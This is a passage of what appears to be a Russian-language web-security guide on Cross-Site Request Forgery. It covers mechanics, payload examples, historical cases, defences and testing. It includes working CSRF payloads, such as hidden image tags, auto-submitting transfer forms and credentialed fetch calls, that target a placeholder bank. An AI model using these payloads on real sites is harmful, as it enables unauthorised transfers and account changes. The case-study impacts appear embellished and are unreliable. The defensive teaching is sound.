## 2. Cross-Site Request Forgery (CSRF)

### Что это такое

Cross-Site Request Forgery (CSRF) — это атака, которая заставляет аутентифицированного пользователя выполнить нежелательное действие в веб-приложении, в котором он в данный момент аутентифицирован. CSRF атаки специфично нацелены на state-changing запросы (создание, изменение, удаление данных), а не на кражу данных, так как злоумышленник не может увидеть ответ на поддельный запрос.

**CVSS Score:** 4.3 - 8.8 (в зависимости от критичности действия)
**CWE ID:** CWE-352
**OWASP Top 10:** A01:2021 – Broken Access Control

### Как работает механизм атаки

CSRF эксплуатирует доверие, которое сайт имеет к браузеру пользователя. Работает следующим образом:

1. **Пользователь аутентифицирован:** Жертва залогинена на legitimate сайте (например, банк.com), браузер хранит session cookie
2. **Посещение вредоносного сайта:** Пользователь посещает сайт злоумышленника (например, через phishing email)
3. **Автоматический запрос:** Вредоносный сайт автоматически отправляет запрос на банк.com
4. **Браузер добавляет credentials:** Браузер автоматически включает cookies банк.com в запрос (это поведение по умолчанию)
5. **Сервер обрабатывает:** Банк.com видит валидную сессию и выполняет действие
6. **Нежелательное действие выполнено:** Деньги переведены, настройки изменены, аккаунт скомпрометирован

**Ключевой момент:** Злоумышленник не видит ответ от сервера, но действие выполняется.

### Типы CSRF атак

#### 2.1 GET-based CSRF

**Характеристики:**
- Самый простой тип
- Использует GET запросы для state-changing операций (плохая практика)
- Может быть выполнен через `<img>`, `<iframe>`, `<script>` теги

**Пример атаки:**
```html
<!-- На вредоносном сайте evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=10000"
     style="display:none">

<!-- Или через iframe -->
<iframe src="https://bank.com/deleteAccount?confirm=yes"
        style="display:none"></iframe>

<!-- Автоматически загрузится при открытии страницы -->
```

**Impact:** Средний (легко выполнить, но многие приложения не используют GET для критичных операций)

#### 2.2 POST-based CSRF

**Характеристики:**
- Более распространенный
- Требует автоматической отправки формы
- Сложнее для жертвы заметить

**Пример атаки:**
```html
<!-- На вредоносном сайте -->
<body onload="document.getElementById('csrf-form').submit()">
    <form id="csrf-form" action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker-account">
        <input type="hidden" name="amount" value="10000">
    </form>
</body>

<!-- Форма отправится автоматически при загрузке страницы -->
```

**JavaScript вариант:**
```html
<script>
fetch('https://bank.com/api/transfer', {
    method: 'POST',
    credentials: 'include', // Важно - включает cookies
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        to: 'attacker-account',
        amount: 10000
    })
});
</script>
```

**Impact:** Высокий (покрывает большинство state-changing операций)

#### 2.3 JSON-based CSRF

**Характеристики:**
- Более сложный, но возможный
- Использует особенности CORS и Content-Type
- Может обойти некоторые защиты

**Пример атаки:**
```html
<form action="https://api.bank.com/transfer" method="POST" enctype="text/plain">
    <input name='{"to":"attacker","amount":10000,"ignore":"' value='"}'>
</form>

<!-- Создаст тело запроса похожее на JSON -->
<script>
document.forms[0].submit();
</script>
```

### Реальные кейсы с финансовым impact

#### YouTube (2008) - Массовая компрометация

**Что произошло:**
CSRF уязвимость позволяла выполнять произвольные действия от имени пользователя, включая загрузку видео, подписки на каналы, и изменение настроек аккаунта.

**Механизм:**
```html
<!-- Злоумышленник создавал страницу -->
<form action="https://youtube.com/watch_queue_ajax?action_add_to_playlist"
      method="POST">
    <input type="hidden" name="video_id" value="PORN_VIDEO_ID">
    <input type="hidden" name="playlist_id" value="VICTIMS_FAVORITES">
</form>
<script>document.forms[0].submit();</script>

<!-- Или для загрузки видео от имени жертвы -->
<form action="https://youtube.com/upload" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="video_file" value="...">
</form>
```

**Результат:**
- Порнографический контент загружен на популярные каналы
- Thousands of accounts compromised
- Репутационный ущерб для платформы
- Экстренное закрытие функционала до исправления

**Урок:** Отсутствие CSRF токенов на критических операциях может привести к массовой компрометации.

#### Netflix (2006) - Манипуляция очередью

**Что произошло:**
CSRF в функции "Add to Queue" позволял добавлять фильмы в очередь пользователя без его ведома.

**Механизм:**
```html
<!-- Злоумышленник встраивал на популярные форумы/сайты -->
<img src="https://netflix.com/AddToQueue?movieid=70111470"
     style="display:none">
```

**Результат:**
- Нарушение приватности пользователей
- Манипуляция рекомендательной системой
- Возможность tracking через специфичные фильмы

**Урок:** Даже "некритичные" действия могут иметь privacy implications.

#### ING Direct Bank (2008) - Финансовые переводы

**Что произошло:**
CSRF позволял выполнять банковские переводы от имени залогиненных пользователей.

**Механизм:**
```html
<form action="https://ingdirect.com/transfer" method="POST">
    <input type="hidden" name="recipient" value="attacker-account">
    <input type="hidden" name="amount" value="5000">
</form>
<script>
    document.forms[0].submit();
    // Перенаправление на безобидную страницу
    setTimeout(() => {
        window.location = 'https://cute-cats.com';
    }, 100);
</script>
```

**Результат:**
- Реальные финансовые потери клиентов
- Судебные иски против банка
- Усиление регуляторного контроля

**Урок:** CSRF на финансовых операциях = прямые денежные потери.

### Технические детали эксплуатации

#### Обход CORS для CSRF

**Simple requests (не требуют preflight):**
```javascript
// Эти запросы НЕ триггерят CORS preflight:
// - GET, HEAD, POST
// - Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain
// - Только простые headers

// CSRF возможен:
fetch('https://bank.com/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'to=attacker&amount=10000'
});
```

**Bypass через форму:**
```html
<!-- Обходит CORS проверки так как это обычная форма -->
<form action="https://bank.com/api/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
```

#### Эксплуатация через iframe

**Скрытый iframe для тихой атаки:**
```html
<iframe name="csrf-frame" style="display:none"></iframe>
<form action="https://bank.com/transfer"
      method="POST"
      target="csrf-frame">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>
    // Отправляем форму в iframe
    document.forms[0].submit();

    // Пользователь ничего не заметит
    // Результат загрузится в скрытый iframe
</script>
```

### Методы защиты

#### 1. CSRF Tokens (Synchronizer Token Pattern)

**Server-side генерация:**
```javascript
// Node.js + Express
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/process', csrfProtection, (req, res) => {
    // Токен автоматически проверяется middleware
    // Если невалидный - 403 Forbidden
    res.send('Data processed');
});
```

**Client-side использование:**
```html
<!-- В форме -->
<form method="POST" action="/process">
    <input type="hidden" name="_csrf" value="<%= csrfToken %>">
    <input type="text" name="data">
    <button type="submit">Submit</button>
</form>

<!-- В AJAX запросах -->
<script>
    const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

    fetch('/api/transfer', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken
        },
        credentials: 'same-origin',
        body: JSON.stringify({ to: 'account', amount: 100 })
    });
</script>
```

#### 2. SameSite Cookie Attribute

**Настройка cookies:**
```javascript
// Server-side
res.cookie('sessionId', sessionId, {
    httpOnly: true,
    secure: true,
    sameSite: 'Strict' // или 'Lax'
});

// Set-Cookie header:
// sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

**Разница между Strict и Lax:**
```
SameSite=Strict:
  - Cookie НЕ отправляется при cross-site запросах вообще
  - Максимальная защита, но может сломать UX
  - Пример: переход по ссылке из email не будет иметь cookie

SameSite=Lax (рекомендуется):
  - Cookie отправляется только для "safe" HTTP методов (GET)
  - Cookie НЕ отправляется для POST/PUT/DELETE с других сайтов
  - Баланс между безопасностью и usability

SameSite=None:
  - Cookie отправляется везде (требует Secure)
  - Используйте только если необходим cross-site access
```

#### 3. Custom Request Headers

**Использование кастомных headers:**
```javascript
// Client
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'X-Requested-With': 'XMLHttpRequest', // Стандартный header для AJAX
        'X-Custom-Header': 'SecretValue' // Или кастомный
    },
    credentials: 'same-origin'
});

// Server проверяет наличие header
app.post('/api/transfer', (req, res) => {
    if (!req.headers['x-requested-with']) {
        return res.status(403).send('Forbidden');
    }
    // Process request
});
```

**Почему это работает:**
- Cross-origin запросы с кастомными headers триггерят CORS preflight
- Preflight не включает credentials (cookies)
- Злоумышленник не может отправить preflight с других доменов

#### 4. Double Submit Cookie Pattern

**Концепция:**
```javascript
// Server устанавливает CSRF token и в cookie, и в response
res.cookie('csrf-token', token, { sameSite: 'Strict' });
res.json({ csrfToken: token });

// Client отправляет token из cookie и из header/body
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': getCookieValue('csrf-token')
    },
    credentials: 'same-origin'
});

// Server проверяет совпадение
app.post('/api/transfer', (req, res) => {
    const cookieToken = req.cookies['csrf-token'];
    const headerToken = req.headers['x-csrf-token'];

    if (cookieToken !== headerToken) {
        return res.status(403).send('CSRF token mismatch');
    }
    // Process
});
```

**Преимущество:** Не требует server-side хранения токенов (stateless).

#### 5. Origin and Referer Header Validation

**Проверка происхождения запроса:**
```javascript
app.post('/api/transfer', (req, res) => {
    const origin = req.headers.origin || req.headers.referer;
    const allowedOrigins = [
        'https://myapp.com',
        'https://www.myapp.com'
    ];

    if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
        return res.status(403).send('Invalid origin');
    }

    // Process request
});
```

**Недостатки:**
- Некоторые browsers/proxies могут удалять Referer header
- Privacy extensions блокируют Referer
- Не полагайтесь на это как единственную защиту

### Как тестировать

#### Ручное тестирование

**1. Проверка наличия CSRF токенов:**
```bash
# Отправляем запрос без CSRF токена
curl -X POST https://target.com/api/transfer \
  -H "Cookie: session=abc123" \
  -H "Content-Type: application/json" \
  -d '{"to":"test","amount":100}'

# Если успешно - уязвимо
# Должно вернуть 403 Forbidden
```

**2. Проверка SameSite cookies:**
```javascript
// В DevTools Console на другом сайте
fetch('https://target.com/api/transfer', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ to: 'test', amount: 100 })
});

// Если успешно - SameSite не настроен или None
```

**3. Создание proof-of-concept:**
```html
<!-- csrf-poc.html -->
<!DOCTYPE html>
<html>
<head>
    <title>CSRF POC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <form id="csrf-form" action="https://target.com/transfer" method="POST">
        <input type="hidden" name="to" value="attacker">
        <input type="hidden" name="amount" value="10000">
    </form>

    <script>
        // Автоматическая отправка или по клику
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```

#### Автоматизированное тестирование

**Burp Suite:**
```
1. Intercept POST request в Burp
2. Right click → "Engagement tools" → "Generate CSRF PoC"
3. Burp автоматически создаст HTML с формой
4. Тестируйте в разных browsers
```

**OWASP ZAP:**
```bash
# Active scan для CSRF
zap-cli active-scan -r https://target.com

# Смотрим алерты
zap-cli alerts -l Informational
```

**Custom script:**
```python
# csrf-test.py
import requests

def test_csrf(url, cookies):
    # Попытка без CSRF токена
    response = requests.post(
        url,
        cookies=cookies,
        data={'to': 'test', 'amount': 100},
        allow_redirects=False
    )

    if response.status_code == 200:
        print(f"[VULNERABLE] {url} - No CSRF protection")
        return True
    elif response.status_code == 403:
        print(f"[PROTECTED] {url} - CSRF token required")
        return False

# Тестирование
cookies = {'session': 'your-session-cookie'}
test_csrf('https://target.com/transfer', cookies)
```

### Контрольный чеклист

**Для разработчиков:**
- [ ] CSRF токены реализованы для всех state-changing операций
- [ ] SameSite=Lax (минимум) для всех session cookies
- [ ] Custom headers (X-Requested-With) для AJAX запросов
- [ ] Origin/Referer validation как дополнительный слой
- [ ] GET запросы НЕ используются для изменения состояния
- [ ] Logout endpoint защищен от CSRF
- [ ] Password change требует текущий пароль (defense in depth)
- [ ] Critical operations требуют re-authentication

**Для security review:**
- [ ] Все POST/PUT/DELETE endpoints проверены на CSRF
- [ ] CSRF токены криптографически случайны (не предсказуемы)
- [ ] Токены имеют ограниченное время жизни
- [ ] Проведено penetration testing с CSRF PoC

